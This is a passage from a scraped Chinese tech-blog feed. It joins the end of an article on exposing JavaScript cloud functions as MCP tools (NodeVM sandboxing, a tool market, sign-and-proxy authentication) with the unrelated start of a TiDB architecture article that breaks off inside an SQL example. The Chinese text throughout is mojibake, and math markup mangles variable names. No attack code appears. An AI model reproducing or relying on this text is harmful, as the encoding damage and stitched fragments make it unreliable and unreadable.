<li>
<p>name</p>
</li>
<li>
<p>description</p>
</li>
<li>
<p>schemaï¼ˆä»¥æ•°ç»„ JSON å½¢å¼å­˜ï¼‰</p>
</li>
<li>
<p>funcï¼ˆåœ¨çº¿ç¼–è¾‘å™¨é‡Œçš„ JS ä»£ç ï¼‰</p>
</li>
</ul>
<p>æŒ‰ MCP éœ€è¦çš„æ ¼å¼åšäº†ä¸€å±‚æ˜ å°„ï¼š</p>
<ul>
<li>
<p>è¾“å…¥ â†’ paramsSchemaï¼ˆzod æ ¡éªŒï¼‰</p>
</li>
<li>
<p>æ‰§è¡Œ â†’ dynamicStructuredTool.call()</p>
</li>
<li>
<p>è¾“å‡º â†’ MCP æ ‡å‡†çš„ content[{ type: 'text', text: ... }]</p>
</li>
</ul>
<p>StructuredTool å†…éƒ¨ï¼šä» MCP å…¥å‚åˆ° NodeVM æ‰§è¡Œçš„æœ€åä¸€æ­¥</p>
<p>DynamicStructuredTool.call() é‡Œé¢æœ€ç»ˆä¼šèµ°åˆ° _call()ï¼Œè¿™ä¸€æ­¥å°±æ˜¯å‰é¢ä»‹ç»çš„ NodeVM æ²™ç®±æ‰§è¡Œï¼š</p>
<ul>
<li>
<p>æŠŠ MCP ä¼ è¿›æ¥çš„å‚æ•°å˜æˆ $xxx å˜é‡</p>
</li>
<li>
<p>æŠŠ cookie / envã€ä»¥åŠä¼šè¯ä¿¡æ¯å¡è¿› $flow</p>
</li>
<li>
<p>æ³¨å…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mi>u</mi><mi>u</mi><mi>m</mi><mi>i</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">yuumiã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">uu</span><span class="mord mathnormal">mi</span><span class="mord cjk_fallback">ã€</span></span></span></span></span>json2MarkdownTableã€<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>i</mi><mi>l</mi><mi>i</mi><mi>I</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>x</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">biliIndexã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">bi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">ã€</span></span></span></span></span>deepseekã€$chatgpt ç­‰èƒ½åŠ›</p>
</li>
<li>
<p>åœ¨å—é™ä¾èµ–ç™½åå•ä¸‹åˆ›å»º NodeVM</p>
</li>
<li>
<p>ä»¥ module.exports = async function() { ${this.code} }() çš„å½¢å¼æ‰§è¡Œå¼€å‘è€…å†™çš„ JS</p>
</li>
</ul>
<p>å¯¹äºä¸Šå±‚ MCP è°ƒç”¨æ–¹æ¥è¯´ï¼š</p>
<blockquote>
<p>è°ƒç”¨äº†ä¸€ä¸ªåå­—å« QueryLiveRoomInfo çš„ MCP å·¥å…·ï¼Œä¼ äº†ä¸€äº›å‚æ•°ï¼Œæ”¶åˆ°äº†ä¸€ä¸ªæ–‡æœ¬/Markdown ç»“æœ</p>
</blockquote>
<p>è€Œå¯¹äºæˆ‘ä»¬å¹³å°æ¥è¯´ï¼Œè¿™ä¸­é—´å…¶å®å·²ç»æ‰§è¡Œäº†ä¸€æ•´å¥—ï¼š</p>
<blockquote>
<p>MCP â†’ McpServer.tool â†’ DynamicStructuredTool â†’ NodeVM â†’ å†…ç½‘æœåŠ¡çš„å®Œæ•´é“¾è·¯ã€‚</p>
</blockquote>
<p><strong>å¯å¤ç”¨å¯å…±äº«çš„MCPå¸‚åœº</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ed971fdf5df4a2ab0be5684d57c01e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=Txis9r1N0n1kXq8%2F5QLbV1L1T%2Bs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯¹äº MCP æ–°æ‰‹ï¼Œæˆ‘ä»¬åœ¨å¹³å°ä¸Šè¿˜æä¾›äº†â€œMCP å¸‚åœºâ€ çš„å…¥å£ï¼Œé‡Œé¢è¿˜æä¾›äº†ä¸€é”®è°ƒè¯•ï¼š</p>
<ul>
<li>
<p>ä¸éœ€è¦çœŸçš„è¿ä¸Šä¸€ä¸ªå¤§æ¨¡å‹</p>
</li>
<li>
<p>ç›´æ¥åœ¨æµè§ˆå™¨é‡Œæ¨¡æ‹Ÿä¸€æ¬¡ MCP ToolCall</p>
</li>
<li>
<p>çœ‹çœ‹äº‘å‡½æ•°æœ‰æ²¡æœ‰è·‘å¯¹ã€è¿”å›æ˜¯ä¸æ˜¯ AI å‹å¥½çš„æ ¼å¼</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dce174203064e108bcdb39c92288af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=%2FV0T98v4oJyRcUTStOEOPSyN3tE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-16"><strong>å…­ã€èº«ä»½é‰´æƒï¼šMCP æ˜¯ç‹¬ç«‹æœåŠ¡ï¼Œå®‰å…¨å¿…é¡»å…ˆæƒ³æ¸…æ¥š</strong></h2>
<p>MCP æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªâ€œè·¨å¹³å°çš„æœåŠ¡è®¿é—®å…¥å£â€ï¼Œå¦‚æœä¸åšé‰´æƒï¼Œå¾ˆå®¹æ˜“å˜æˆæ— æ³•ç®¡ç†ã€‚æˆ‘ä»¬çš„åšæ³•å¤§è‡´æ˜¯è¿™æ ·ï¼š</p>
<ol>
<li>Â æ³¨å†Œé˜¶æ®µå°±è¦å¸¦ signï¼š</li>
</ol>
<ul>
<li>æ¯ä¸ª MCP å·¥å…·çš„æ³¨å†Œåœ°å€å¿…é¡»å¸¦ä¸€ä¸ª sign å‚æ•°</li>
<li>sign æ˜¯åŸºäºå†…ç½‘è§„èŒƒç­¾å‡ºçš„ç­¾å</li>
<li>æ²¡æœ‰åˆæ³•ç­¾åï¼Œå·¥å…·ä¸ä¼šè¢«æ³¨å†ŒæˆåŠŸ</li>
</ul>
<ol start="2">
<li>Â è°ƒç”¨é˜¶æ®µç»Ÿä¸€ Proxyï¼š</li>
</ol>
<ul>
<li>å¤–éƒ¨ Agent è°ƒç”¨ MCP Server</li>
<li>MCP Server æŠŠè°ƒç”¨è½¬å‘ç»™äº‘å‡½æ•°å¹³å°çš„ Proxy å±‚</li>
<li>Proxy å±‚ä¼šï¼š</li>
</ul>

<ul>
<li>æ ¡éªŒ sign</li>
<li>æ³¨å…¥å¯¹åº”çš„ $cookie / ä¼šè¯</li>
<li>å†å»è°ƒçœŸæ­£çš„å†…ç½‘ä¸šåŠ¡æ¥å£</li>
</ul>
<ol start="3">
<li>Â ä¸šåŠ¡ä¾§æ‹¿åˆ°çš„æ˜¯â€œå¤„ç†åçš„å†…ç½‘åè®®â€ï¼š</li>
</ol>
<ul>
<li>
<p>Proxy ä¼šæŠŠ sign è§£å¯†ã€æ ¡éªŒåï¼Œä»¥å†…éƒ¨ç»Ÿä¸€æ ¼å¼é€ä¼ ç»™ä¸šåŠ¡</p>
</li>
<li>
<p>é¿å…åœ¨ä¸šåŠ¡é‡Œæºæ‚å„ç§å¤–éƒ¨åè®®ç»†èŠ‚</p>
</li>
</ul>
<p>è¿™æ ·ï¼ŒMCP æ—¢å¯ä»¥å¯¹å¤–æš´éœ²ç»Ÿä¸€çš„å·¥å…·æ¥å£ï¼Œåˆä»ç„¶å—æ§åœ¨å†…ç½‘çš„å®‰å…¨ä½“ç³»å†…</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e5f2ebf9d4142d4bc94d958b15b1ddc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766133819&amp;x-signature=l%2F1ltMpqyWMkMgGXyElyZedDkM4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-17"><strong>ä¸ƒã€ç»“è¯­ï¼šæŠŠâ€œæ¥ AIâ€å˜æˆâ€œå†™ä¸€ä¸ªäº‘å‡½æ•°â€</strong></h2>
<p>ä» AIå·¥ä½œæµ â†’ StructuredTool â†’ äº‘å‡½æ•°å¹³å° â†’ MCP çš„è¿™æ¡è·¯å¾„ï¼Œæˆ‘ä»¬æœ€ç»ˆå¾—åˆ°äº†ï¼š</p>
<ul>
<li>
<p>ä¸€ä¸ªç»Ÿä¸€çš„å·¥å…·å®šä¹‰æ–¹å¼ï¼šå…ƒä¿¡æ¯</p>
</li>
<li>
<p>ä¸€ä¸ªç»Ÿä¸€çš„æ‰§è¡Œæ–¹å¼ï¼šNodeVM</p>
</li>
<li>
<p>ä¸€ä¸ªç»Ÿä¸€çš„è°ƒç”¨åè®®ï¼šMCP</p>
</li>
<li>
<p>ä¸€ä¸ªç»Ÿä¸€çš„å…±äº«æ–¹å¼ï¼šå·¥å…·å¸‚åœº</p>
</li>
<li>
<p>ä¸€ä¸ªç»Ÿä¸€çš„å®‰å…¨ä½“ç³»ï¼šsign + cookie</p>
</li>
</ul>
<p>ä¹Ÿè®©æˆ‘ä»¬çœŸæ­£åšåˆ°äº†ï¼š</p>
<p>è®©ä¸šåŠ¡åŒå­¦ä¸å†å…³å¿ƒâ€œæ€ä¹ˆæ¥ AIâ€ï¼Œè€Œæ˜¯åªéœ€è¦å…³å¿ƒâ€œæˆ‘èƒ½ç»™ AI æä¾›ä»€ä¹ˆèƒ½åŠ›â€ã€‚</p>
<p>æŠŠå†™ä¸€ä¸ª JS å‡½æ•°ï¼Œå˜æˆç»™ AI åŠ ä¸€ä¸ªæ–°èƒ½åŠ›ã€‚</p>
<p>æœªæ¥æˆ‘ä»¬è¿˜ä¼šç»§ç»­æå‡è¿è¡Œæ—¶æ€§èƒ½ã€æ­£ç¡®æ€§è¯„ä¼°è§‚æµ‹ã€æ·±åº¦ç ”ç©¶ç­‰æ–¹å‘ï¼ŒæŠŠå·¥å…·èƒ½åŠ›å»ºè®¾å¾—æ›´ç°ä»£ã€æ›´ä¼ä¸šçº§ã€‚</p>
<p>-End-</p>
<p>ä½œè€…ä¸¨Zeroooã€Gengar</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TiDBè¯¦è§£ä¸åº”ç”¨å®æˆ˜ï¼šåˆ†å¸ƒå¼æ•°æ®åº“çš„æ ¸å¿ƒåŸç†ä¸æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7582561515816763455</link>    <guid>https://juejin.cn/post/7582561515816763455</guid>    <pubDate>2025-12-12T07:00:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582561515816763455" data-draft-id="7582502441993977899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TiDBè¯¦è§£ä¸åº”ç”¨å®æˆ˜ï¼šåˆ†å¸ƒå¼æ•°æ®åº“çš„æ ¸å¿ƒåŸç†ä¸æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2025-12-12T07:00:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ITæ©˜å­çš®"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TiDBè¯¦è§£ä¸åº”ç”¨å®æˆ˜ï¼šåˆ†å¸ƒå¼æ•°æ®åº“çš„æ ¸å¿ƒåŸç†ä¸æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ITæ©˜å­çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T07:00:23.000Z" title="Fri Dec 12 2025 07:00:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1 TiDBæ¶æ„è®¾è®¡ä¸æ ¸å¿ƒåŸç†</h2>
<p>TiDBæ˜¯PingCAPå…¬å¸å¼€å‘çš„å¼€æºåˆ†å¸ƒå¼å…³ç³»å‹æ•°æ®åº“ï¼Œé‡‡ç”¨è®¡ç®—å­˜å‚¨åˆ†ç¦»çš„æ¶æ„è®¾è®¡ï¼Œå®Œç¾ç»“åˆäº†ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“çš„ACIDç‰¹æ€§ä¸NoSQLæ•°æ®åº“çš„æ°´å¹³æ‰©å±•èƒ½åŠ›ã€‚ä½œä¸ºæ–°ä¸€ä»£çš„<strong>äº‘åŸç”Ÿæ•°æ®åº“</strong>ï¼ŒTiDBå®Œå…¨å…¼å®¹MySQLåè®®ï¼Œä½¿å¾—ç°æœ‰MySQLåº”ç”¨å¯ä»¥å‡ ä¹æ— ç¼è¿ç§»åˆ°TiDBå¹³å°ï¼ŒåŒæ—¶è·å¾—åˆ†å¸ƒå¼æ¶æ„å¸¦æ¥çš„è¯¸å¤šä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒæ¶æ„ç»„ä»¶ä¸åä½œæœºåˆ¶</h3>
<p>TiDBé‡‡ç”¨åˆ†å±‚æ¶æ„è®¾è®¡ï¼ŒåŒ…å«ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼šTiDB Serverï¼ˆè®¡ç®—å±‚ï¼‰ã€TiKVï¼ˆå­˜å‚¨å±‚ï¼‰å’ŒPDï¼ˆè°ƒåº¦å±‚ï¼‰ã€‚è¿™ç§<strong>ç»„ä»¶åˆ†ç¦»æ¶æ„</strong>ä½¿å¾—æ¯ä¸ªå±‚çº§å¯ä»¥ç‹¬ç«‹æ‰©å±•å’Œä¼˜åŒ–ï¼Œæä¾›äº†æå¤§çš„çµæ´»æ€§ã€‚</p>
<ul>
<li><strong>TiDB Serverï¼ˆè®¡ç®—å±‚ï¼‰</strong> ï¼šä½œä¸ºæ— çŠ¶æ€SQLå±‚ï¼Œè´Ÿè´£SQLè§£æã€ä¼˜åŒ–å’Œæ‰§è¡Œã€‚å®ƒå…¼å®¹MySQLåè®®å’Œå¤§å¤šæ•°MySQLè¯­æ³•ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥åƒä½¿ç”¨MySQLä¸€æ ·è¿æ¥TiDBã€‚TiDB Serverå°†SQLè¯·æ±‚è½¬æ¢ä¸ºå¯¹TiKVçš„Key-Valueæ“ä½œï¼Œå¹¶æ±‡æ€»å­˜å‚¨å±‚è¿”å›çš„ç»“æœã€‚</li>
<li><strong>TiKVï¼ˆå­˜å‚¨å±‚ï¼‰</strong> ï¼šåˆ†å¸ƒå¼é”®å€¼å­˜å‚¨å¼•æ“ï¼ŒåŸºäºRaftå…±è¯†ç®—æ³•ä¿è¯æ•°æ®å¼ºä¸€è‡´æ€§å’Œé«˜å¯ç”¨æ€§ã€‚TiKVå°†æ•°æ®åˆ’åˆ†ä¸ºRegionï¼ˆé»˜è®¤96MB-256MBï¼‰ï¼Œæ¯ä¸ªRegioné€šè¿‡Multi-Raftåè®®ç»´æŠ¤å¤šä¸ªå‰¯æœ¬ï¼Œç¡®ä¿æ•°æ®å®‰å…¨å’Œé«˜å¯ç”¨ã€‚</li>
<li><strong>PDï¼ˆPlacement Driverï¼‰</strong> ï¼šé›†ç¾¤çš„"å¤§è„‘"ï¼Œè´Ÿè´£å…ƒæ•°æ®ç®¡ç†ã€å…¨å±€æ—¶é—´æˆ³åˆ†é…ã€è´Ÿè½½å‡è¡¡å’Œè‡ªåŠ¨æ•…éšœæ¢å¤ã€‚PDé€šè¿‡æŒç»­ç›‘æ§é›†ç¾¤çŠ¶æ€ï¼Œè‡ªåŠ¨è°ƒåº¦Regionå‰¯æœ¬ï¼Œä¼˜åŒ–æ•°æ®åˆ†å¸ƒå’Œè´Ÿè½½å‡è¡¡ã€‚</li>
</ul>
<h3 data-id="heading-2">1.2 æ•°æ®åˆ†å¸ƒä¸Regionç®¡ç†</h3>
<p>TiDBé‡‡ç”¨åŸºäºRangeçš„æ•°æ®åˆ†ç‰‡ç­–ç•¥ï¼Œå°†æ•´ä¸ªKey-Valueç©ºé—´åˆ†æˆå¤šä¸ªè¿ç»­çš„æ®µï¼Œæ¯ä¸ªæ®µç§°ä¸ºä¸€ä¸ªRegionã€‚å½“Regionå¤§å°è¾¾åˆ°é˜ˆå€¼ï¼ˆé»˜è®¤256MiBï¼‰æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ†è£‚ä¸ºä¸¤ä¸ªå­Regionï¼›å½“Regionå› å¤§é‡åˆ é™¤å˜å¾—å¤ªå°æ—¶ï¼Œä¼šå°†ç›¸é‚»å°Regionåˆå¹¶ã€‚è¿™ç§<strong>è‡ªåŠ¨åˆ†ç‰‡æœºåˆ¶</strong>ç¡®ä¿äº†æ•°æ®åˆ†å¸ƒçš„åŠ¨æ€å¹³è¡¡ï¼Œé¿å…äº†ä¼ ç»Ÿåˆ†åº“åˆ†è¡¨éœ€è¦æ‰‹åŠ¨ç»´æŠ¤çš„å¤æ‚æ€§ã€‚</p>
<p>PDç»„ä»¶é€šè¿‡å¤šç§è°ƒåº¦å™¨å®ç°æ™ºèƒ½è°ƒåº¦ï¼š</p>
<ul>
<li><strong>balance-leader-scheduler</strong>ï¼šä¿æŒä¸åŒèŠ‚ç‚¹çš„Leaderå‡è¡¡</li>
<li><strong>balance-region-scheduler</strong>ï¼šä¿æŒä¸åŒèŠ‚ç‚¹çš„Peerå‡è¡¡</li>
<li><strong>hot-region-scheduler</strong>ï¼šä¿æŒä¸åŒèŠ‚ç‚¹çš„è¯»å†™çƒ­ç‚¹Regionå‡è¡¡</li>
</ul>
<h3 data-id="heading-3">1.3 åˆ†å¸ƒå¼äº‹åŠ¡ä¸ä¸€è‡´æ€§æœºåˆ¶</h3>
<p>TiDBå®ç°äº†å®Œæ•´çš„åˆ†å¸ƒå¼äº‹åŠ¡æœºåˆ¶ï¼Œé‡‡ç”¨ä¼˜åŒ–çš„ä¸¤é˜¶æ®µæäº¤ï¼ˆ2PCï¼‰åè®®ï¼Œå¹¶åŸºäºPercolatoräº‹åŠ¡æ¨¡å‹å¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡ã€‚å…³é”®æœºåˆ¶åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å…¨å±€æ—¶é—´æˆ³åˆ†é…</strong>ï¼šPDä½œä¸ºå…¨å±€æ—¶é—´æˆ³åˆ†é…å™¨ï¼ˆTSOï¼‰ï¼Œä¸ºæ¯ä¸ªäº‹åŠ¡åˆ†é…å…¨å±€å”¯ä¸€ä¸”é€’å¢çš„æ—¶é—´æˆ³ï¼Œç”¨äºå®ç°MVCCå’Œå…¨å±€å¿«ç…§éš”ç¦»ã€‚</li>
<li><strong>å¼‚æ­¥æäº¤ä¼˜åŒ–</strong>ï¼šTiDB 4.0å¼•å…¥çš„Async Commitç‰¹æ€§ï¼Œå¯¹äºå°äº‹åŠ¡è¾¾åˆ°ç±»ä¼¼1PCçš„æ•ˆæœï¼Œå‡å°‘ç½‘ç»œå¾€è¿”æ¬¡æ•°ï¼Œæ˜¾è‘—æå‡çŸ­äº‹åŠ¡æ€§èƒ½ã€‚</li>
<li><strong>å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰</strong> ï¼šTiKVå®ç°å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼Œæ¯ä¸ªæ•°æ®ä¿®æ”¹éƒ½ä¼šç”Ÿæˆæ–°çš„ç‰ˆæœ¬ï¼Œç”±æ—¶é—´æˆ³åŒºåˆ†ç‰ˆæœ¬ï¼Œå®ç°è¯»å†™ä¸é˜»å¡çš„å¿«ç…§éš”ç¦»ã€‚</li>
</ul>
<h2 data-id="heading-4">2 TiDBå…³é”®æŠ€æœ¯æ·±åº¦è§£æ</h2>
<h3 data-id="heading-5">2.1 HTAPæ··åˆè´Ÿè½½æ”¯æŒ</h3>
<p>TiDBé€šè¿‡TiFlashç»„ä»¶å®ç°HTAPèƒ½åŠ›ï¼ŒåŒæ—¶æ”¯æŒOLTPå’ŒOLAPå·¥ä½œè´Ÿè½½ã€‚TiFlashæ˜¯åˆ—å¼å­˜å‚¨å¼•æ“ï¼Œé€šè¿‡Multi-Raft Learneråè®®å®æ—¶ä»TiKVå¤åˆ¶æ•°æ®ï¼Œç¡®ä¿ä¸TiKVä¹‹é—´çš„æ•°æ®å¼ºä¸€è‡´æ€§ã€‚</p>
<p><strong>è¡Œåˆ—æ··åˆæ¶æ„</strong>çš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li><strong>å®æ—¶åˆ†æ</strong>ï¼šTiFlashä»¥ä½æ¶ˆè€—ä¸é˜»å¡TiKVå†™å…¥çš„æ–¹å¼å®æ—¶å¤åˆ¶æ•°æ®ï¼ŒåŒæ­¥å»¶è¿Ÿæ§åˆ¶åœ¨ç§’çº§ï¼Œå®ç°çœŸæ­£çš„å®æ—¶åˆ†æã€‚</li>
<li><strong>æ™ºèƒ½é€‰æ‹©</strong>ï¼šTiDBä¼˜åŒ–å™¨ä¼šæ ¹æ®æŸ¥è¯¢ç‰¹å¾å’Œç»Ÿè®¡ä¿¡æ¯æ™ºèƒ½é€‰æ‹©TiKVï¼ˆè¡Œå­˜ï¼‰æˆ–TiFlashï¼ˆåˆ—å­˜ï¼‰ï¼Œç”šè‡³åœ¨åŒä¸€æŸ¥è¯¢å†…æ··åˆä½¿ç”¨ä¸¤ç§å­˜å‚¨ã€‚</li>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼šOLTPè´Ÿè½½è¿è¡Œåœ¨TiKVä¸Šï¼ŒOLAPå¤æ‚æŸ¥è¯¢è¿è¡Œåœ¨TiFlashä¸Šï¼Œé¿å…åˆ†ææŸ¥è¯¢å¯¹äº‹åŠ¡å¤„ç†çš„å¹²æ‰°ã€‚</li>
</ul>
<p>å®é™…æ“ä½œä¸­ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä½¿ç”¨TiFlashï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- è®¾ç½®TiFlashå‰¯æœ¬</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> orders <span class="hljs-keyword">SET</span> TIFLASH REPLICA <span class="hljs-number">2</span>;

